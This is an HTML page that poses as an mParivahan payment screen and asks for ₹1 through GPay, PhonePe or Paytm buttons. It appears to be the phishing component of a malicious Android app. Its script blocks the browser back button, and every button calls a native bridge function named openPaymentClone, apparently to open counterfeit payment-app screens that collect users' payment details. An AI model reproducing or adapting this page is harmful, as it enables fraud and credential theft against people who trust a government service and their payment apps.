<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#4f46e5">
  <title>Payment - mParivahan</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    html, body {
      width: 100%;
      height: 100%;
      overflow: hidden;
      position: fixed;
    }
    
    body {
      background: linear-gradient(135deg, #4f46e5, #7c3aed);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
      padding: 20px;
    }
    
    .card {
      background: #fff;
      border-radius: 20px;
      padding: 30px 20px;
      width: 100%;
      max-width: 300px;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
    }
    
    .price {
      font-size: 42px;
      font-weight: 700;
      color: #4f46e5;
      margin-bottom: 30px;
    }
    
    .methods {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 25px;
    }
    
    .method {
      width: 70px;
      height: 70px;
      background: #f5f5f5;
      border: 2px solid #e0e0e0;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: all 0.2s;
    }
    
    .method:active {
      transform: scale(0.95);
      border-color: #4f46e5;
    }
    
    .method img {
      width: 80%;
      height: 80%;
      object-fit: contain;
    }
    
    .pay-btn {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #4f46e5, #7c3aed);
      color: #fff;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(79, 70, 229, 0.4);
    }
    
    .pay-btn:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="price">â‚¹1</div>
    
    <div class="methods">
      <div class="method" onclick="selectPaymentMethod('gpay')">
        <img src="google-pay-icon.png" alt="GPay">
      </div>
      <div class="method" onclick="selectPaymentMethod('phonepe')">
        <img src="phonepe-icon.png" alt="PhonePe">
      </div>
      <div class="method" onclick="selectPaymentMethod('paytm')">
        <img src="paytm-icon.png" alt="Paytm">
      </div>
    </div>
    
    <button class="pay-btn" onclick="selectPaymentMethod('gpay')">Pay Now</button>
  </div>

  <script>
    history.pushState(null, null, location.href);
    window.onpopstate = function() { history.go(1); };
    
    function selectPaymentMethod(method) {
      if (typeof Android !== 'undefined' && Android.openPaymentClone) {
        Android.openPaymentClone(method);
      }
    }
  </script>
</body>
</html>
